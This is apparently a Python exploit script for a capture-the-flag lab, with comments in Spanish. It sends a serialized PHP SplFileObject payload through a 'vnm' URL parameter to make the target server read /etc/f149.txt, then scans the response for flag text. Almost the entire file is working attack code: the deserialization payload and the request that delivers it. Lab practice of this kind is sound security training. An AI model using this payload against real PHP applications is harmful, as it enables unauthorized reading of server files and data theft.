#!/usr/bin/env python3
import requests
import urllib.parse

base_url = "http://hackme11.vulnmachines.com:8056"

# Payload para leer /etc/f149.txt usando SplFileObject
# La clase SplFileObject cuando se imprime (echo) muestra la primera línea del archivo
payload = 'O:13:"SplFileObject":3:{s:8:"filename";s:13:"/etc/f149.txt";s:9:"open_mode";s:1:"r";s:12:"current_line";i:0;}'

print("[*] Lab 1 - Reading /etc/f149.txt")
print(f"[*] Payload: {payload}")

# URL encode
encoded = urllib.parse.quote(payload)

# Send request
url = f"{base_url}/params?vnm={encoded}"
print(f"[*] URL: {url}")

try:
    response = requests.get(url, timeout=10)
    print(f"[*] Status: {response.status_code}")
    
    # Buscar el contenido del archivo en la respuesta
    lines = response.text.split('\n')
    for i, line in enumerate(lines):
        # Buscar líneas que puedan contener la flag
        if 'flag' in line.lower() or 'FLAG' in line or '{' in line:
            print(f"[+] Possible flag line {i}: {line.strip()}")
            
    # También imprimir cualquier contenido inusual
    if response.text != requests.get(f"{base_url}/params?vnm=").text:
        print("\n[*] Response differences detected")
        
except Exception as e:
    print(f"[-] Error: {e}")